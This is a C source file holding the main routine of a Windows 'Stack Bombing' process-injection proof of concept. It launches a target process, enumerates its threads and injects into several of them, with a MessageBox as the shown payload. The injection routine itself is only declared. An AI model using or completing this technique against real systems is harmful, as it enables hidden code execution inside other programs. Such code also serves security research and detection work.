#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <string.h>

// Forward declarations
DWORD NameToPID(const wchar_t* processName);
DWORD* ListProcessThreads(DWORD pid);
BOOL StackBombingInject(DWORD pid, DWORD tid);

int main(int argc, char* argv[]) {
    printf("[+] Stack Bombing Injection POC\n");
    printf("[+] NtQueueApcThread + memset Stack Writing\n");
    printf("[+] Original Research: maziland\n\n");

    if (argc != 2) {
        printf("Usage: %s <process_name>\n", argv[0]);
        printf("\n");
        printf("Example:\n");
        printf("  %s notepad.exe\n", argv[0]);
        printf("\n");
        printf("Note:\n");
        printf("  - Target process will be launched automatically\n");
        printf("  - Stack Bombing will inject into all threads\n");
        printf("  - Uses ROP chain to call MessageBoxA (POC)\n");
        return 1;
    }

    // Convert process name to wide string
    size_t nameLen = strlen(argv[1]) + 1;
    wchar_t* processName = (wchar_t*)malloc(nameLen * sizeof(wchar_t));
    mbstowcs(processName, argv[1], nameLen);

    // Launch target process
    printf("[*] Launching target process: %S\n", processName);

    wchar_t cmdLine[MAX_PATH];
    if (wcsstr(processName, L"notepad")) {
        wcscpy(cmdLine, L"C:\\Windows\\System32\\notepad.exe");
    } else {
        swprintf(cmdLine, MAX_PATH, L"%s", processName);
    }

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to launch process: %lu\n", GetLastError());
        free(processName);
        return 1;
    }

    printf("[+] Process launched: PID = %lu\n", pi.dwProcessId);
    Sleep(1000); // Wait for process to initialize

    DWORD pid = pi.dwProcessId;

    // Get all threads
    printf("[*] Enumerating threads...\n");
    DWORD* threads = ListProcessThreads(pid);
    if (threads == NULL) {
        printf("[-] Failed to enumerate threads\n");
        free(processName);
        return 1;
    }

    // Inject into first few threads
    int threadCount = 0;
    for (int i = 0; threads[i] != 0xcafebabe && i < 10; i++) {
        threadCount++;
    }

    printf("[+] Found %d threads\n", threadCount);
    printf("[*] Injecting into threads...\n\n");

    for (int i = 0; threads[i] != 0xcafebabe && i < 3; i++) {
        printf("[*] Injecting into thread %lu\n", threads[i]);
        if (StackBombingInject(pid, threads[i])) {
            printf("[+] Injection successful\n");
        } else {
            printf("[-] Injection failed\n");
        }
        Sleep(300);
        printf("\n");
    }

    free(threads);
    free(processName);

    printf("[+] Stack Bombing completed!\n");
    printf("[!] Check target process for MessageBox popup\n");

    return 0;
}
